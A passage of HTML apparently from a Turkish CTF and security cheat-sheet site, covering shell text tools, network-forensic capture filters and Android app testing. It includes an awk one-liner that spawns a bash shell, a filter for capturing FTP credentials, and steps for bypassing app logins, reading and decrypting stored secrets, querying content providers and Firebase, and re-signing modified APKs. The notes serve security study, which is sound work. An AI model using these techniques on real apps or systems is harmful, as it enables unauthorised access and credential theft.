+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>awk </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>'BEGIN
+{system(&quot;/bin/bash&quot;)}'<o:p></o:p></span></p>
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>TXT<o:p></o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>Grep and
+Sort and Uniq and Diff<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><span style='mso-spacerun:yes'> </span>&quot;strings data.txt | grep
+&quot;millionth&quot; “<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><span style='mso-spacerun:yes'> </span>&quot;sort data.txt | uniq
+-c&quot; <o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><span style='mso-spacerun:yes'> </span>“short -U | uniq &gt;
+newList.txt”<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><span style='mso-spacerun:yes'> </span>“diff passwords.new<span
+style='mso-spacerun:yes'>  </span>passwords.old “<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='margin-left:89.4pt;mso-add-space:auto;
+text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>“rotating encryption decoding”<o:p></o:p></span></p>
+
+			</pre>
+		</div>
+
+		<div id="C10">
+			<h1 id="network" align=center style='color: darkgreen;text-align:center'>Network Forensic</h1>
+			<pre>
+				<p class=MsoNormal align=center style='text-align:center'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='color:red'>Sadece belli bir ip<o:p></o:p></span></p>
+
+<p class=MsoNormal>Host &lt;ip&gt;</p>
+
+<p class=MsoNormal><span style='color:red'>Tüm ağ<o:p></o:p></span></p>
+
+<p class=MsoNormal>Net &lt;ip.0/24&gt;</p>
+
+<p class=MsoNormal><span style='color:red'>Mask kullanmak<o:p></o:p></span></p>
+
+<p class=MsoNormal>Net &lt;ip.0/24 or mask 255.255.255.0&gt;</p>
+
+<p class=MsoNormal><span style='color:red'>Kaynak makineden giden paketleri
+dinlemek<o:p></o:p></span></p>
+
+<p class=MsoNormal>Src net &lt;ip.0/24&gt;</p>
+
+<p class=MsoNormal><span style='color:red'>Taşıma Katmanı<o:p></o:p></span></p>
+
+<p class=MsoNormal>Port 53</p>
+
+<p class=MsoNormal><span style='color:red'>Dns<o:p></o:p></span></p>
+
+<p class=MsoNormal>Dns.port cq 53</p>
+
+<p class=MsoNormal><span style='color:red'>Tcp<o:p></o:p></span></p>
+
+<p class=MsoNormal>Tcp.port eq 53</p>
+
+<p class=MsoNormal>Domain</p>
+
+<p class=MsoNormal>Host <a href="http://www.domain.com">www.domain.com</a></p>
+
+<p class=MsoNormal><span style='color:red'>Macc address<o:p></o:p></span></p>
+
+<p class=MsoNormal>Ether dst &lt;mac&gt; </p>
+
+<p class=MsoNormal><span style='color:red'>Uzantılar<o:p></o:p></span></p>
+
+<p class=MsoNormal>http.request.uri contains “png”</p>
+
+<p class=MsoNormal><span style='color:red'>Hata Sayfaları<o:p></o:p></span></p>
+
+<p class=MsoNormal>http.response.code == 404</p>
+
+<p class=MsoNormal><span style='color:red'>Http Metotları<o:p></o:p></span></p>
+
+<p class=MsoNormal>http.request.method == “POST”</p>
+
+<p class=MsoNormal><span style='color:red'>Dosya Türleri<o:p></o:p></span></p>
+
+<p class=MsoNormal>http.content_type[0:4] == “text”</p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#E7E6E6;mso-themecolor:
+background2'>http.content_type[0:5] == &quot;image/gif<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#E7E6E6;mso-themecolor:
+background2'>ftp.request.command == &quot;USER&quot; and
+&quot;ftp.request.command == &quot;PASS&quot;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif'><o:p>&nbsp;</o:p></span></p>
+			</pre>
+		</div>
+
+
+		<div id="C11">
+			<h1 align=center id="android" style='color: white;text-align:center'>Android Forensic</h1>
+			<pre>
+				<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><span style='color:#00B050'>apktool (dalvik byte code)<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='color:red'>apktool d &lt;</span>app.apk<span
+style='color:red'>&gt;</span></p>
+
+<p class=MsoNormal><span style='color:red'>apktool b &lt;</span>app_debug<span
+style='color:red'>&gt; -o </span>newapk.apk</p>
+
+<p class=MsoNormal>https://github.com/CalebFenton/simplify</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><span style='color:#00B050'>jadx (java kaynak kod)<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l23 level1 lfo43'><![if !supportLists]><span
+style='mso-bidi-font-family:Calibri;mso-bidi-theme-font:minor-latin;color:#00B0F0'><span
+style='mso-list:Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='color:red'>jadx -d &lt;</span>çıkarılacak_klasör<span
+style='color:red'>&gt; &lt;</span>app.apk<span style='color:red'>&gt; --deobf</span><span
+style='color:#C00000'><o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l23 level1 lfo43'><![if !supportLists]><span
+style='mso-bidi-font-family:Calibri;mso-bidi-theme-font:minor-latin;color:#00B0F0'><span
+style='mso-list:Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='color:#C00000'>dex2jar &lt;apk&gt;<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast><span style='color:#C00000'>jd-gui<o:p></o:p></span></p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><span style='color:#00B050'>Key oluştur<o:p></o:p></span></p>
+
+<p class=MsoNormal>keytool -genkey -v -keystore my-release-key.keystore -alias
+ogulcan_cyber -keyalg RSA -keysize 2048 -validity 10000</p>
+
+<p class=MsoNormal><span style='color:#00B050'>apk imzalama<o:p></o:p></span></p>
+
+<p class=MsoNormal>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1
+-keystore my-release-key.keystore &lt;newapp.apk&gt; ogulcan_cyberjar</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><span style='color:#00B050'>şifresiz giriş<o:p></o:p></span></p>
+
+<p class=MsoNormal>- Manifest dosyasından, launcher_activity değiştir.</p>
+
+<p class=MsoNormal>- exported=true: hangi activityde var bunu bul. Bulduktan
+sonra uygulamayı çalışır hale getir ve adb shell ile telefona bağlan. &quot;am
+start -n &lt;activity&gt;&quot; komutu ile şifresiz giriş yap.</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><span style='color:#00B050'>kriptoloji (sharedpreferences)<o:p></o:p></span></p>
+
+<p class=MsoNormal>&quot;adb shell&quot;</p>
+
+<p class=MsoNormal>&quot;cd /data/data&quot;</p>
+
+<p class=MsoNormal>&quot;ls&quot;</p>
+
+<p class=MsoNormal>uygulamanının datasını bul</p>
+
+<p class=MsoNormal>&quot;cd &lt;app_data&gt;&quot;</p>
+
+<p class=MsoNormal>&quot;cd shared_prefs&quot;</p>
+
+<p class=MsoNormal>&quot;cat mySharedPrefereces.xml&quot;</p>
+
+<p class=MsoNormal>google git</p>
+
+<p class=MsoNormal>&quot;decrypt aes256 with key online&quot;</p>
+
+<p class=MsoNormal>text=&quot;superSecurePassword&quot;</p>
+
+<p class=MsoNormal>mode=&quot;CBC&quot;</p>
+
+<p class=MsoNormal>secretKey=javadan al</p>
+
+<p class=MsoNormal>&quot;Decrypt&quot;</p>
+
+<p class=MsoNormal>&quot;decode to plain text&quot;</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><span style='color:#00B050'>Content Provider<o:p></o:p></span></p>
+
+<p class=MsoNormal>kaynak kodlarda content provider bulalım ve gideceği tırnak
+işaretleri arasındaki yolu kopyalayalım. Daha sonra</p>
+
+<p class=MsoNormal>&quot;adb shell&quot;</p>
+
+<p class=MsoNormal>&quot;content query --uri
+&lt;content://com.android.contentProviderUrl&quot;</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><span style='color:#00B050'>Firebase Database<o:p></o:p></span></p>
+
+<p class=MsoNormal>kaynak kod içersinide strings.xml'e gir
+&quot;project_id&quot; al.</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal>curl -X GET <br>&quot;https://firestore.googleapis.com/v1/projects/&lt;<br>proje_id/databases/(default)/documents/&lt;koleksiyon_adı&quot;;</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><span style='color:#00B050'>.ab: uzantısı açmak için<o:p></o:p></span></p>
+
+<p class=MsoNormal>( printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; ; tail
+-c +25 cat.ab ) |<span style='mso-spacerun:yes'>  </span>tar xvz</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+			</pre>
+		</div>
+
+				
+		</secltion>
+		<aside id="yanmenu" class="col-4">
+			<a href="#üst"><img src="Images/up.png">	</a>
+		</aside>
+	</div>
+
+	<footer id="alt" class="row">
+		<div id="altmenu" class="col-12">
+
+			<div id="iconAlt">
+				<a href="https://discord.gg/tzxfQmut" target="_blank"><img src="Images/discord.png" title="discord" alt="discord"></a>
+			</div>
+			<div id="iconAlt">
+				<a  href="mailto:oglcnkcr54_kcr@outlook.com"><img src="Images/outlook.png" alt="outlook" title="outlook"></a>
+			</div>
+			<div id="iconAlt">
+				<a href="https://play.google.com/store/apps/dev?id=6520298174878575178" target="_blank"><img src="Images/googlePlay.png" alt="google play" title="google play"></a>
+			</div>
+			<div id="iconAlt">
+				<a href="https://www.instagram.com/ogulcan_kcr" target="_blank"><img src="Images/instagram.png" title="instagram" alt="instagram"></a>
+			</div>
+			<ul>
+				<li>created by Oğulcan KAÇAR</li>
+			</ul>
+		</div>
+	</footer>
+
+
+
+
+
+
+
+</body>
+</html>
